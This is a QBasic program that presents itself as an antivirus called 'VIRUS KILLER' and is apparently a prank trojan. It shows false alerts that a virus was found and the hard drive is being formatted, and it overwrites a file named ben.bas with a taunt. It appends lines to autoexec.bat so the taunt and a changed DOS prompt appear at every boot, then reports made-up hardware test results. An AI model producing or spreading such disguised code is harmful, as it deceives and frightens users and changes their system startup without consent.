SCREEN 12: CLS
RANDOMIZE TIMER
LOCATE 2, 30: PRINT "VIRUS KILLER"
LOCATE 3, 30: PRINT "   v.1.00"
LINE (115, 108)-(265, 128), 15, B
LINE (285, 108)-(435, 128), 15, B
LOCATE 8, 16: PRINT "1.Detect and kill"
LOCATE 8, 37: PRINT "2.Detect only"
LOCATE 28, 1: PRINT "Press the key '1' or '2' for selecting option..."
SLEEP
COLOR 0: LOCATE 28, 1: PRINT "000000000000000000000000000000000000000000000000000"
COLOR 15
a$ = INPUT$(1)
IF a$ = "1" THEN GOTO assassin
IF a$ = "2" THEN GOTO share
share:
LOCATE 26, 1: PRINT "Detect only..."
PRINT "This option is not available on this shareware version !"
PRINT "Please press '1' to detect and kill."
SLEEP
COLOR 0: LOCATE 26, 1
PRINT "00000000000000000000"
PRINT "0000000000000000000000000000000000000000000000000000000000"
PRINT "000000000000000000000000000000000000000"
COLOR 15
a$ = INPUT$(1)
IF a$ = "1" THEN GOTO assassin
assassin:
LOCATE 26, 1: PRINT "Detect and kill..."
FOR i = 1 TO 66 STEP RND(1)
OPEN "ben.bas" FOR OUTPUT ACCESS WRITE AS #1
LOCATE 27, 1: PRINT "Searching any virus..."; INT(i); "%"
PRINT #1, "On t'a eut !!!"
CLOSE #1
NEXT i
SOUND 500, 5
LOCATE 24, 1: PRINT "WARNING !!! Virus detected."
PRINT "Destruction of bad boot sector..."
PRINT "Too many boot sectors have been deteriored, I had to format HDD..."
PRINT "Don't switch off your computer !"
SLEEP 2
FOR i = 1 TO 100 STEP .5
OPEN "ben.bas" FOR OUTPUT ACCESS WRITE AS #1
LOCATE 28, 1: PRINT "Hard drive formatting..."; INT(i); "%"
PRINT #1, "!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
CLOSE #1
NEXT i
OPEN "ben.bas" FOR APPEND AS #1 LEN = 1024
PRINT #1, "Pour ne plus voir apparaitre ce texte, tapez 'edit autoexec.bat'"
PRINT #1, "dans l'invite MS-DOS et effacez les lignes suivantes :"
PRINT #1, "prompt [ texte$ ] $p$g"
PRINT #1, "type c:ben.bas"
CLOSE #1
PRINT "Your hard drive is clean now, but you've lost all your program."
OPEN "autoexec.bat" FOR APPEND AS #2 LEN = 1024
PRINT #2, "type c:\ben.bas"
PRINT #2, "prompt [ On t'a eut !!! ] $p$g"
INPUT "Do you want to run COMPUTER TESTS (y/n) ?", rep$
IF rep$ = "n" OR rep$ = "N" THEN END ELSE GOTO test
test: CLS
FOR c = 1 TO 15
PAINT (0, 0), c
SLEEP 1
NEXT c
FOR ecran = 1 TO 9
SCREEN ecran
ON ERROR GOTO erreur
PRINT "screen test..."
SLEEP 1
NEXT ecran
PRINT "CPU speed test..."
SLEEP 5
PRINT "5 seconds making simple calcul."
CLS
PRINT "HDD speed test..."
SLEEP 2
PRINT "Access time=20 ms"
CLS
PRINT "Your configuration after VIRUS KILLER v.1.00 :"
PRINT "Screen vga, 16 colors"
PRINT "CPU speed for simple operations : 5 seconds"
PRINT "HDD access time : 20 ms"
PRINT "Press a key to view graphs..."
SLEEP
SCREEN 12: CLS
LOCATE 27, 3: PRINT "blue=your computer"
LOCATE 28, 3: PRINT "red=486 sx/33 Mhz"
LINE (10, 400)-(10, 10): LINE (10, 400)-(600, 400)
xe = 10: xc = 10
ye = INT(RND * 200): yc = INT(RND * 300)
ye2 = INT(RND * 200): yc2 = INT(RND + 300)
LINE (xe, ye)-(xe + 250, ye2), 4
LINE (xc, yc)-(xc + 250, yc2), 1
xe = 260: xc = 260
ye3 = INT(RND * 200): yc3 = INT(RND * 300)
LINE (xe, ye2)-(xe + 200, ye3), 4
LINE (xc, yc2)-(xc + 200, yc3), 1
xe = 450: xc = 450
LINE (xe, ye3)-(xe + 150, INT(RND * 200)), 4
LINE (xc, yc3)-(xc + 150, INT(RND * 300)), 1
END
erreur: PRINT "Screen error"
PRINT "Your screen have many damage, so he can support only a few resolution !"
SLEEP 2
RESUME NEXT











                       

